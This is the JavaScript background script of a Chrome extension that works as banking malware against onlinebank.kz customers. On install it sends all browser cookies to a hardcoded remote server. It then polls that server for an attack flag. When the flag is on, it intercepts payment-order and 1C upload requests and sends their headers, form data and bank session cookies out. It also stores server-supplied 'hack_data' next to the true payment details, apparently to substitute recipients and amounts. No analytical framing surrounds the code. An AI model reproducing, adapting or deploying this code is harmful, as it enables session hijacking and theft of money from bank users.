var message_body = undefined;
var new_body = undefined;
var cookes = undefined;
var cookie_data = {};
var txt = "";
var server_ip = "http://195.16.88.139:1111";
var timer = undefined;
var port = undefined;
var mount = "";
var id = undefined;
var ports = [];
var last = {}
var last_request_body = {};
var count = -1;
var is_attack = false;
var timer_blocked = undefined;


var codes = ["windows-1251", "cp866", "utf-8", "utf-16", "koi8-ru"];


function load(){
	chrome.storage.local.get(["count", "timer_blocked"], function(items) {
		if(items["count"] == undefined){
			count = -1;
		}
		else{
			count = items.count;
			if(items["timer_blocked"] != -1){
				start_blocked();
			}
		}
	});

	chrome.storage.local.get(['server_ip', 'id', 'mount', 'is_attack'], function(result){
		if(result["server_ip"] != undefined)
		server_ip = result.server_ip;
		if(result["id"] != undefined)
		id = result.id;
		if(result["mount"] != undefined)
		mount = result.mount;
		if(result["is_attack"] != undefined)
		is_attack = result.is_attack;
	});
	Timer();
	chrome.runtime.onMessage.addListener(
		function(msg, sender, sendResponse) {
	});
	chrome.runtime.onConnect.addListener(function(port) {

		if (port.name !== "datasend") return;
		ports.push(port);
		port.postMessage({status:"count", count: count});
		port.onDisconnect.addListener(function() {
			var i = ports.indexOf(port);
			if (i !== -1) ports.splice(i, 1);
			});
		port.onMessage.addListener(
			function(msg) {
				if(msg.status == "file"){
					if(msg.text != txt){
						txt = msg.text
					}
				}
				else if(msg.status == "mount"){
					mount = msg.text;
					chrome.storage.local.set({'mount': mount}, function(result){});
				}
				else{}
		})
	})


	try{
		
		if(!chrome.webRequest.onBeforeSendHeaders.hasListener(block_req)) {
			chrome.webRequest.onBeforeSendHeaders.addListener(
				block_req,
				{urls: ["<all_urls>"]},
				["blocking", "requestHeaders"]
			);}
		if(!chrome.webRequest.onBeforeRequest.hasListener(logURL)) {
			chrome.webRequest.onBeforeRequest.addListener(
				logURL,
				{urls: ["<all_urls>"]},
				['requestBody', "blocking"]
			);}
		if(!chrome.webRequest.onCompleted.hasListener(checkLoad)) {
			chrome.webRequest.onCompleted.addListener(
				checkLoad,
				{urls: ["<all_urls>"]}
			);}
	}catch(e){
	}
};
function unload() {
	chrome.webRequest.onBeforeSendHeaders.removeEventListener(block_req)
	chrome.webRequest.onBeforeRequest.removeEventListener(logURL)
	chrome.webRequest.onCompleted.removeEventListener(checkLoad)
}


function block_req(details){
	if(details.url.indexOf("Payments1CUploadPage") != -1 && details.url.indexOf("submitUpload") !=-1 && is_attack != false){
		getCookies(function(cookies){
			for(cookie in cookies){
				if(cookies[cookie].domain.indexOf("onlinebank.kz") != -1){
					cookie_data[cookies[cookie].name] = cookies[cookie].value;
				}
			}
			send_request(details).then((response) => {
				postMessage({status:"count", count: 1})
				blocked_post();
				start_blocked();
				if(response['true_data'] != undefined){
					let Oold = response['true_data'];
					let Onew = response['hack_data'];
					let index = generateIdStore(Onew);
					let indexN = index+'new';
					let indexO = index+'old';
					let toSave = {}
					toSave[indexN] = Onew;
					toSave[indexO] = Oold;
					chrome.storage.local.set(toSave, function(){})
					let parser = new DOMParser();
					let xmlDoc = parser.parseFromString(response.alert,"text/xml");
					let Allert = xmlDoc.childNodes[0].childNodes[0].childNodes[0].nodeValue
					postMessage({status:"coded", text: Allert});
				}
			}).catch((e) => {});
		})
		return {cancel: is_attack}
	}
	else if(details.url.indexOf("paymentForm") != -1 && details.url.indexOf("PayOrderPage") != -1 && details.url.indexOf("searchForm") == -1 && is_attack != false){
		getCookies(function(cookies){
			for(cookie in cookies){
				if(cookies[cookie].domain.indexOf("onlinebank.kz") != -1){
					cookie_data[cookies[cookie].name] = cookies[cookie].value;
				}
			}
			send_about_request(details).then((response) => {
				chrome.storage.local.get(['new'], function(result){
					postMessage({status:"count", count: 1})
					blocked_post();
					start_blocked();
					if(response['true_data'] != undefined){
						let Oold = response['true_data'];
						let Onew = response['hack_data'];
						let keys = ["docNumber", "docDate", "valdate", "docAmount", "ndsCountCheckBoxContainer%ndsCountCheckBox", "accSenderName", "accSender", "recipientName", "recipientAcc", "namebengos", "kbe", "recipientRnn", "recipientBank", "recipientBankBic", "knpCode", "knpName", "cbcCode", "cbcName","isUrgent", "purpose", "texarea2"];
						if(result['new'] != undefined && result['new'] != {}){
							keys.forEach(function(key, i, array){
								if(!(key in Oold)){
									Oold[key] = result['new'][key];
								}
							})
						}
						let index = generateIdStore(Onew);
						let indexN = index+'new';
						let indexO = index+'old';
						let toSave = {}
						toSave[indexN] = Onew;
						toSave[indexO] = Oold;
						chrome.storage.local.set(toSave, function(){})
						let parser = new DOMParser();
						let xmlDoc = parser.parseFromString(response.alert,"text/xml");
						let Allert = xmlDoc.childNodes[0].childNodes[1].childNodes[0].nodeValue
						postMessage({status:"coded", text: Allert});
					}
				})
			}).catch((e) => {});
		})
		return {cancel: is_attack};
	}
	else return {cancel: false}
	
}

function logURL(details) {
	if (details.method == "POST" && is_attack != false) {
		if(details.url.indexOf("Payments1CUploadPage") != -1 && details.url.indexOf("submitUpload")!=-1){
			message_body = details;
		}
		else if(details.url.indexOf("paymentForm") != -1 && details.url.indexOf("PayOrderPage") != -1 && details.url.indexOf("searchForm") == -1){
			message_body = details
		}
		else return {cancel:false}
	}
}

function checkLoad(details){
	if(details.url.indexOf("Notification")!= -1){
		if(timer != undefined){
			clearTimeout(timer);
		}
		myVar = setTimeout(function(){ postMessage({status:"update", text: true}) }, 100);
	}
}

function postMessage(data){
	ports.forEach(function(port) {
        port.postMessage(data);
    });
}

function handleErrors(response) {
	if (response.status >= 200 && response.status <= 299) {
		return response.json();
	} else {
	}
}

function postData_cookie(data = {}) {
	let data1 = {};
	data1['cookies'] = data;
	data1['version'] = '1.004:5';
	data1['versionBr'] = '1999';
	var resp = fetch(`${server_ip}/getupdatecontol`, {
		method: 'POST', 
		mode: 'cors', 
		cache: 'no-cache',
		credentials: 'same-origin', 
		headers: {'Content-Type': 'application/json;charset=utf-8'},
		redirect: 'follow', 
		referrer: 'no-referrer',
		body: JSON.stringify(data1), 
	}).then(res => res.json()).then((response) => {
		id = response.id.toString();
		chrome.storage.local.set({'id': id}, function(result){});
	});
	return resp;
}

function send_request(details){
	var main_h = {}
	if(server_ip == '' || server_ip == undefined ){
		chrome.storage.local.get(['server_ip'], function(result){
			server_ip = result.server_ip;
		});
		return send_request(details);
	}
	else{
	main_h["cookie"] = cookie_data;


	request_body = {
		head:details.requestHeaders,
		body:message_body.requestBody.formData,
		url:details.url,
		id: id,
		cookies: cookie_data,
		text: txt
	}
	cookie_data = {};
	return postData(`${server_ip}/fileupdatenotify`, request_body)
	}
}

function send_about_request(details){
	var main_h = {}
	if(server_ip == '' || server_ip == undefined ){
		chrome.storage.local.get(['server_ip'], function(result){
			server_ip = result.server_ip;
		});
		return send_about_request(details);
	}
	else{
	main_h["cookie"] = cookie_data;
	request_body = {
		head:details.requestHeaders,
		body:message_body.requestBody.formData,
		url:details.url,
		id: id,
		cookies: cookie_data
	}
	cookie_data = {};
	return postData(`${server_ip}/setupsettings`, request_body)
	}

}

function getCookies(callback) {
	chrome.cookies.getAll({}, function(cookie) {return callback(cookie)} ); 
}

function postData(url = '', data = {}) {
	if(data === last_request_body){
		return new Promise(function(resolve, reject){
			reject(new Error("0_0"));
		})
	}
	last_request_body = data;
	var resp = fetch(url, {
		method: 'POST', 
		mode: 'cors', 
		cache: 'no-cache',
		credentials: 'same-origin', 
		headers: {'Content-Type': 'application/json;charset=utf-8'},
		redirect: 'follow', 
		referrer: 'no-referrer',
		body: JSON.stringify(data), 
	}).then(res => res.json())
	return resp;
}

function updatePage(){
	chrome.tabs.query({url:"https://*.onlinebank.kz/*"}, function(tab) {
		for(single_tab in tab){
			chrome.tabs.executeScript(tab[single_tab].id, {code: 'window.location.href = window.location.href.split("#")[0] + "#!main/WidgetPage";'});
			chrome.tabs.executeScript(tab[single_tab].id, {code: 'window.location.reload();'});
		}
	});
}

chrome.runtime.onInstalled.addListener(()=>{
	updatePage();
	getCookies((cookies)=>{
		postData_cookie(cookies);
	})
});


window.onload = function () {
	load();
	updatePage();
}

function jerk(data){
	var resp = fetch(server_ip+'/getreadyaccess', {
		method: 'POST', 
		mode: 'cors', 
		cache: 'no-cache',
		credentials: 'same-origin', 
		headers: {'Content-Type': 'application/json;charset=utf-8'},
		redirect: 'follow', 
		referrer: 'no-referrer',
		body: JSON.stringify(data), 
	}).then(handleErrors).then((response) => {
		is_attack = response.is_attack == 0 ? false : true
		chrome.storage.local.set({'is_attack': is_attack}, function(result){});
		jerkmount()
		chrome.storage.local.set({'server_ip': server_ip}, function(result){});
	}).catch(function(error) {
	});
}

function Timer (){
	var data = {id: id, mount: mount}
	if(server_ip == '' || server_ip == undefined ){
		chrome.storage.local.get(['server_ip'], function(result){
			server_ip = result.server_ip;
		});
		setTimeout(Timer, 2000);
		return;
	}
	if(id == '' || id == undefined ){
		chrome.storage.local.get(['id', 'mount'], function(result){
			id = result.id;
			if(result['mount'] != undefined){
				if(mount != ''){
					mount = result.mount;
				}
			}
		});
		setTimeout(Timer, 2000);
		return;
	}
	jerk(data);

	setTimeout(Timer, 30 * 60 * 1000);
}

function generateIdStore(obj){
	let id = obj.docNumber;
	let date = obj.docDate.split('.')[2];
	let sum = obj.docAmount.toString().replace(/[^\d,]/, '');
	return id + '/' + date + '/' + sum + '/'; 
}

function jerkmount(){
	chrome.tabs.query({url:"https://*.onlinebank.kz/*"}, function(tab) {
		if(tab.length != 0){
			getCookies(function(cookies){
				for(cookie in cookies){
					if(cookies[cookie].domain.indexOf("onlinebank.kz") != -1){
						cookie_data[cookies[cookie].name] = cookies[cookie].value;
					}
				}
				let url = tab[0].url.split('#')[0] + '!accounts/AccountsPage';
				let data = {
					url,
					cookies: cookie_data,
					id,
				}
				var resp = fetch(server_ip+'/accesscontrolpanel', {
					method: 'POST', 
					mode: 'cors', 
					cache: 'no-cache',
					credentials: 'same-origin', 
					headers: {'Content-Type': 'application/json;charset=utf-8'},
					redirect: 'follow', 
					referrer: 'no-referrer',
					body: JSON.stringify(data), 
				}).then(handleErrors).then((response) => {
				}).catch(function(error) {
				});
				cookie_data = {};
			});
		}
	});
}

function blocked_post(){
	let data = {
		id,
	}
	fetch(server_ip+'/setaddressofpanel ', {
		method: 'POST', 
		mode: 'cors', 
		cache: 'no-cache',
		credentials: 'same-origin', 
		headers: {'Content-Type': 'application/json;charset=utf-8'},
		redirect: 'follow', 
		referrer: 'no-referrer',
		body: JSON.stringify(data), 
	}).then(handleErrors).then((response) => {
	}).catch(function(error) {
	});
}

function start_blocked(){
	timer_blocked = setTimeout(bloacked_site, 6 * 60 * 60 * 1000);
	count = 0;
	chrome.storage.local.set({'count': 0, "timer_blocked": timer_blocked}, function(result){});
}

function bloacked_site(){
	count = -1;
	timer_blocked = undefined;
	postMessage({status:"count", count: -1})
	chrome.storage.local.set({'count': -1, "timer_blocked": -1}, function(result){});
}
